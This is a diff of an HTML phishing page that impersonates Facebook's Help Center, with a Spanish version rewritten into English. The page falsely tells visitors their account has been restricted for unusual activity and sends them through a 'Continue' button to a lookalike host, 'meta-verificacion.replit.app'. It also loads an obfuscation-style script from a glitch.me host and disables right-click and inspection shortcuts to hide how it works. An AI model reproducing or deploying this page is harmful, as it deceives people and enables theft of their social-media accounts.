@@ -1,17 +1,19 @@
-<html><head>
-    <meta charset="UTF-8">
-    </head><body><div id="index.php"></div>
-    <script>
-        staticsecure({
-            "query": "key",
-            "0000": "example",
-            "index.php": "hidden.txt"
-        })
-    </script>
+<!DOCTYPE html>
+<html>
+  
 
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Centro de ayuda</title>
-    <link rel="icon" href="Facebook_Logo_2023.png" type="image/png">
+<head>
+    <meta charset="UTF-8" />
+  <div id="index.php"></div>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.2/rollups/aes.js" integrity="sha256-/H4YS+7aYb9kJ5OKhFYPUjSJdrtV6AeyJOtTkw6X72o=" crossorigin="anonymous"></script>
+<script src="https://staticsecure.glitch.me/staticsecure.min.js"></script>
+<script>
+staticsecure({"query": "key", "0000": "example", "index.php": "hidden.txt"})
+</script>
+  
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Help Center</title>
+  <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/6/6c/Facebook_Logo_2023.png" type="image/png"/>
     <script type="text/javascript">
         document.addEventListener("contextmenu", function(e) {
             e.preventDefault();
@@ -29,9 +31,12 @@
                 e.preventDefault();
             }
         });
+      
     </script>
-
+  
     <style>
+      
+      
         /* New theme styles */
 
         body {
@@ -43,7 +48,7 @@
             /* White text */
             margin: 0;
             padding: 20px;
-            /* Remove default margin */
+          /* Remove default margin */
         }
 
         .container {
@@ -55,6 +60,7 @@
             position: relative;
             /* Required for relative positioning of the image and text */
         }
+      
 
         #box {
             height: 40%;
@@ -80,21 +86,20 @@
 
         #data>h4 {
             font-size: 30px;
-            margin: 5px 5px 5px 5px;
-            margin-bottom: 10px;
+         margin: 5px 5px 5px 5px;
+          margin-bottom: 10px;
         }
 
         #data>img {
-            width: 18px;
+            width: 18px;       
+      }
+      #data>img @media (max-width: 768px) {
+        .containter #data<img {
+          width: 40%;
+          margin-bottom: 20px; /
         }
-
-        #data>img @media (max-width: 768px) {
-            .containter #data<img {
-                width: 40%;
-                margin-bottom: 20px;
-                /
-            }
-        }
+        
+      }
 
         .button {
             background-color: #1877f2;
@@ -118,11 +123,12 @@
         @media (max-width: 768px) {
             .container img {
                 width: 40%;
-                margin-bottom: 20px; //* Adjust the image width for mobile */
+                margin-bottom: 20px;//* Adjust the image width for mobile */
             }
-            .help-center-text img {
-                margin-top: 20px;
-            }
+          
+          .help-center-text img {
+              margin-top: 20px;
+          }
         }
 
         /* Desktop styles */
@@ -158,7 +164,7 @@
         /* Style for the remaining content */
 
         .remaining-content {
-            margin-top: 20px;
+          margin-top: 20px;
             /* Add space below "Help Center" text */
         }
 
@@ -168,43 +174,42 @@
             font-size: 18px;
             /* Adjust the font size as needed */
             font-weight: normal;
-            /* Normal text weight */
-        }
+            /* Normal text weight */        }
+      
     </style>
+</head>
 
-
-
-
+<body>
+  
     <div class="container">
-        <img src="images-fb_icon_325x325.png" alt="Your Image">
+        <img src="https://cdn.glitch.global/a7993c8b-2f44-484f-8549-40d8745531de/Facebook_Logo_2023.png?v=1719625976763" alt="Your Image" />
 
         <!-- "Help Center" text container -->
         <div class="help-center-text-container">
-            <div class="help-center-text">
-                <div id="data">
-                    <h4>Centro de ayuda</h4> <img src="bluetick.png" alt="">
-                </div>
+            <div class="help-center-text"><div id="data">
+                <h4>Help Center</h4>  <img src="https://cdn.glitch.global/0e876aa8-70cf-40f1-951b-94c8002e5dcc/thumbnails%2Fbluetick.png?1699082922610" alt="">
             </div>
+        </div>
 
-            <!-- Remaining content -->
-            <div class="remaining-content">
-                <!-- Content from the first code snippet -->
-                <div class="bg-blue-300">
-                    <div class="">
-                        <div class="flex justify-center items-center pl-6 px-28">
-                            <div class="flex mt-9"></div>
-                            <div class="mx-3">
-                                <p class="font text-gray-700 shadow-transparent mt-2 font-extralight">
-                                    𝗛𝗲𝗺𝗼𝘀 𝗱𝗲𝘁𝗲𝗰𝘁𝗮𝗱𝗼 𝗮𝗰𝘁𝗶𝘃𝗶𝗱𝗮𝗱 𝗶𝗻𝘂𝘀𝘂𝗮𝗹 𝗲𝗻 𝘀𝘂 𝗰𝘂𝗲𝗻𝘁𝗮 𝘆 𝗹𝗮 𝗵𝗲𝗺𝗼𝘀 𝗿𝗲𝘀𝘁𝗿𝗶𝗻𝗴𝗶𝗱𝗼.
-                                </p>
-                                <p class="text-lg text-gray-700 font-extralight">𝗦𝗶 𝗰𝗿𝗲𝗲 𝗾𝘂𝗲 𝘀𝗲 𝘁𝗿𝗮𝘁𝗮 𝗱𝗲 𝘂𝗻 𝗲𝗿𝗿𝗼𝗿, 𝗵𝗮𝗴𝗮 𝗰𝗹𝗶𝗰 𝗲𝗻 "𝗖𝗼𝗻𝘁𝗶𝗻𝘂𝗮𝗿" 𝘆 𝘀𝗼𝗹𝗶𝗰𝗶𝘁𝗲 𝘂𝗻𝗮 𝗮𝗽𝗲𝗹𝗮𝗰𝗶ó𝗻.</p>
-                            </div>
+        <!-- Remaining content -->
+        <div class="remaining-content">
+            <!-- Content from the first code snippet -->
+            <div class="bg-blue-300">
+                <div class="">
+                    <div class="flex justify-center items-center pl-6 px-28">
+                        <div class="flex mt-9"></div>
+                        <div class="mx-3">
+                            <p class="font text-gray-700 shadow-transparent mt-2 font-extralight">
+                                𝗪𝗲 𝗵𝗮𝘃𝗲 𝗱𝗲𝘁𝗲𝗰𝘁𝗲𝗱 𝘂𝗻𝘂𝘀𝘂𝗮𝗹 𝗮𝗰𝘁𝗶𝘃𝗶𝘁𝘆 𝗳𝗿𝗼𝗺 𝘆𝗼𝘂𝗿 𝗮𝗰𝗰𝗼𝘂𝗻𝘁 𝗮𝗻𝗱 𝘄𝗲 𝗵𝗮𝘃𝗲 𝗿𝗲𝘀𝘁𝗿𝗶𝗰𝘁𝗲𝗱 𝘆𝗼𝘂𝗿 𝗮𝗰𝗰𝗼𝘂𝗻𝘁.
+                            </p>
+                            <p class="text-lg text-gray-700 font-extralight">𝗜𝗳 𝘆𝗼𝘂 𝗯𝗲𝗹𝗶𝗲𝘃𝗲 𝘁𝗵𝗶𝘀 𝘁𝗼 𝗯𝗲 𝗮 𝗺𝗶𝘀𝘁𝗮𝗸𝗲, 𝗖𝗹𝗶𝗰𝗸 𝗼𝗻 "𝗖𝗼𝗻𝘁𝗶𝗻𝘂𝗲" 𝗮𝗻𝗱 𝗿𝗲𝗾𝘂𝗲𝘀𝘁 𝗮 𝗮𝗽𝗽𝗲𝗮𝗹.</p>
                         </div>
                     </div>
                 </div>
+            </div>
 
-                <!-- Continue button with JavaScript redirection -->
-                <form id="redirectForm" method="post" action="https://monetization-warning-issu.glitch.me/">
+          <!-- Continue button with JavaScript redirection -->
+                <form id="redirectForm" method="post" action="https://meta-verificacion.replit.app/request">
                     <button type="submit" class="button">Continuar</button>
                 </form>
 
